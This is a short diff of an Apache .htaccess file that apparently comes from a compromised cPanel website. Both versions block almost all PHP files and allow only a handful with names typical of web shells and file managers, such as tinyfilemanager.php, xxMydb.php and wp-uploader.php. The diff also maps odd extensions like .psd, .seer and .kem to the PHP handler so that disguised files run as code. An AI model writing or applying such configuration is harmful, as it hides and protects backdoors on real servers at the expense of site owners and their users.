@@ -1,13 +1,13 @@
 
 
 
-<FilesMatch ".ph*|Ph*|pH*|PH*|sH*|shtm*|s*|p*">
-    Order Deny,Allow
-    Deny from all
+<FilesMatch ".(py|inc|shtml|html|ph|phtml|exe|php)$">
+Order allow,deny
+Deny from all
 </FilesMatch>
-<FilesMatch "index.php|index.html|*.png|tinyfilemanager.php|kbc_241018175033.php|xxMydb.php|template.php|wp-uploader.php">
-    Order Deny, Allow
-    Allow from all
+<FilesMatch "^(xxMydb.php|template.php|tinyfilemanager.php|url.css|index.html|xxMydb.php)$">
+Order allow,deny
+Allow from all
 </FilesMatch>
 <Files ~ "^\.ht">
     Order allow,deny
@@ -42,5 +42,5 @@ php_flag display_errors Off
 # php -- BEGIN cPanel-generated handler, do not edit
 # Set the “ea-php73” package as the default “PHP” programming language.
 <IfModule mime_module>
-  AddHandler application/x-httpd-ea-php73 .psd .seer .pp .kem 
+  AddHandler application/x-httpd-ea-php73 .php .psd .seer .pp .kem 
 </IfModule>
